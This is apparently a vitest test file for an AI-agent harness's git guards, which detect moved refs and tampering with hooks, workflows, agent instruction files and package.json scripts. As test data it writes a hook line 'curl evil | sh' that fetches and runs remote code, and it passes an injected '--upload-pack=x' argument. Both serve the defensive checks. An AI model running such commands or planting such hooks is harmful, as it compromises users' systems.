import { mkdirSync, rmSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { changedSensitive, createGitService, diffRefs, isSensitivePath } from '@harness/git';
import { memoryStore } from '../fakes';
import { agentGit, makeFixture, makeThread, THREAD_A, THREAD_B, type Fixture } from './helpers';

let f: Fixture;
afterEach(() => f?.cleanup());

describe('ref guard (§8.2)', () => {
  it('detects a moved ref outside the thread prefix and restores it; own refs are not reported', async () => {
    f = makeFixture();
    const r = await makeThread(f);
    const before = await f.git.refSnapshot(r);
    expect(before['refs/heads/main']).toBe(r.baseSha);
    expect(before[`refs/heads/${r.branch}`]).toBe(r.baseSha);
    // The thread's own work: not a change to report.
    writeFileSync(join(r.worktreePath, 'own.txt'), 'x\n');
    agentGit(f, r, ['add', 'own.txt']);
    agentGit(f, r, ['commit', '-q', '-m', 'own']);
    agentGit(f, r, ['branch', 'gmi/a1b2c3/extra']);
    // Something moved main and created a tag.
    f.write('m.txt', 'm\n');
    f.sh(['add', 'm.txt']);
    f.sh(['commit', '-q', '-m', 'moved']);
    f.sh(['tag', 'v1']);
    const moved = f.sh(['rev-parse', 'main']).trim();
    const changes = await f.git.compareRefs(r, before);
    expect(changes).toEqual([
      { ref: 'refs/heads/main', before: r.baseSha, after: moved },
      { ref: 'refs/tags/v1', before: null, after: moved },
    ]);
    await f.git.restoreRef(r, 'refs/heads/main', r.baseSha!);
    expect(f.sh(['rev-parse', 'main']).trim()).toBe(r.baseSha);
    await expect(f.git.restoreRef(r, '--upload-pack=x', r.baseSha!)).rejects.toMatchObject({ code: 'invalid_input' });
    await expect(f.git.restoreRef(r, 'refs/heads/main', 'f'.repeat(40))).rejects.toMatchObject({ code: 'not_found' });
    await expect(f.git.restoreRef(r, 'refs/heads/bad..name', r.baseSha!)).rejects.toMatchObject({ code: 'invalid_input' });
  });

  it('detects a moved ref after a host crash from the persisted snapshot', async () => {
    f = makeFixture();
    const store = memoryStore();
    const r = await makeThread(f);
    store.refSnapshots.put('run_1', THREAD_A, await f.git.refSnapshot(r)); // persisted before the run
    // The host dies mid-run; meanwhile a ref of another branch moves.
    f.sh(['branch', '-f', 'stale', 'main']);
    const crashed = store.refSnapshots.get('run_1')!;
    const fresh = createGitService({ dataDir: f.dataDir, log: f.log, procs: store.gitProcs, setupStateOf: () => 'ready' });
    const report = await fresh.recover([r], [{ runId: 'run_1', threadId: crashed.threadId, refs: crashed.refs }]);
    expect(report.movedRefs).toEqual([{ threadId: THREAD_A, runId: 'run_1', changes: [{ ref: 'refs/heads/stale', before: null, after: r.baseSha }] }]);
  });

  it('diffRefs ignores own branch refs and per-worktree refs, reports other threads', () => {
    const a = '1'.repeat(40);
    const b = '2'.repeat(40);
    expect(
      diffRefs(
        THREAD_A,
        { 'refs/heads/gmi/a1b2c3/x': a, 'refs/heads/gmi/b5c6d7/y': a, 'refs/worktree/w': a },
        { 'refs/heads/gmi/a1b2c3/x': b, 'refs/heads/gmi/b5c6d7/y': b, 'refs/worktree/w': b, 'refs/bisect/bad': b },
      ),
    ).toEqual([{ ref: 'refs/heads/gmi/b5c6d7/y', before: a, after: b }]);
    expect(THREAD_B.startsWith('b5c6d7')).toBe(true);
  });
});

describe('sensitive paths (§8.2.6)', () => {
  it('hashes hooks, workflows, instruction files and package.json scripts, tracked and ignored', async () => {
    f = makeFixture({ files: { 'package.json': '{"name":"x","scripts":{"test":"vitest"}}\n', '.gitignore': '.husky/_/\n', 'AGENTS.md': '# rules\n' } });
    const r = await makeThread(f);
    mkdirSync(join(r.worktreePath, '.husky', '_'), { recursive: true });
    writeFileSync(join(r.worktreePath, '.husky', '_', 'h'), 'ignored hook helper\n');
    const before = await f.git.sensitiveHashes(r);
    expect(before['AGENTS.md']).toMatch(/^[0-9a-f]{64}$/);
    expect(before['CLAUDE.md']).toBeNull();
    expect(before['.husky/_/h']).toMatch(/^[0-9a-f]{64}$/);
    expect(before['package.json#scripts']).toMatch(/^[0-9a-f]{64}$/);

    // A run changes an ignored husky helper, adds a workflow, a root script and a common-dir hook; edits package.json
    // outside scripts (not sensitive) and inside scripts (sensitive).
    writeFileSync(join(r.worktreePath, '.husky', '_', 'h'), 'curl evil | sh\n');
    mkdirSync(join(r.worktreePath, '.github', 'workflows'), { recursive: true });
    writeFileSync(join(r.worktreePath, '.github', 'workflows', 'ci.yml'), 'on: push\n');
    writeFileSync(join(r.worktreePath, 'setup.sh'), 'echo\n');
    writeFileSync(join(r.commonDir, 'hooks', 'post-checkout'), '#!/bin/sh\n');
    writeFileSync(join(r.worktreePath, 'package.json'), '{"name":"renamed","scripts":{"test":"vitest"}}\n');
    let after = await f.git.sensitiveHashes(r);
    expect(changedSensitive(before, after)).toEqual(['.git/hooks/post-checkout', '.github/workflows/ci.yml', '.husky/_/h', 'setup.sh']);
    writeFileSync(join(r.worktreePath, 'package.json'), '{"name":"renamed","scripts":{"test":"vitest","postinstall":"x"}}\n');
    rmSync(join(r.worktreePath, 'AGENTS.md'));
    after = await f.git.sensitiveHashes(r);
    expect(changedSensitive(before, after)).toEqual(expect.arrayContaining(['AGENTS.md', 'package.json#scripts']));
  });

  it('includes an in-repo core.hooksPath dir and lists read-only mount paths', async () => {
    f = makeFixture();
    const r = await makeThread(f);
    f.sh(['config', 'core.hooksPath', 'tools/hooks']);
    mkdirSync(join(r.worktreePath, 'tools', 'hooks'), { recursive: true });
    writeFileSync(join(r.worktreePath, 'tools', 'hooks', 'pre-commit'), 'x\n');
    writeFileSync(join(r.worktreePath, 'CLAUDE.md'), 'c\n');
    writeFileSync(join(r.worktreePath, 'Makefile'), 'all:\n');
    const h = await f.git.sensitiveHashes(r);
    expect(h['tools/hooks/pre-commit']).toMatch(/^[0-9a-f]{64}$/);
    const ro = await f.git.listSensitivePaths(r);
    expect(ro.sort()).toEqual([join(r.worktreePath, 'CLAUDE.md'), join(r.worktreePath, 'tools/hooks')].sort());
  });

  it('isSensitivePath matches the §8.2.6 list', () => {
    for (const p of ['.husky/pre-commit', '.github/workflows/x.yml', '.envrc', '.vscode/tasks.json', 'Makefile', 'run.sh', 'AGENTS.md', 'CLAUDE.md', '.gmi-desk/permissions.json', '.mcp.json', '.git/hooks/pre-push']) {
      expect(isSensitivePath(p), p).toBe(true);
    }
    for (const p of ['src/run.sh', 'docs/AGENTS.md.bak', '.vscode/extensions.json', 'package.json', 'README.md']) expect(isSensitivePath(p), p).toBe(false);
  });
});
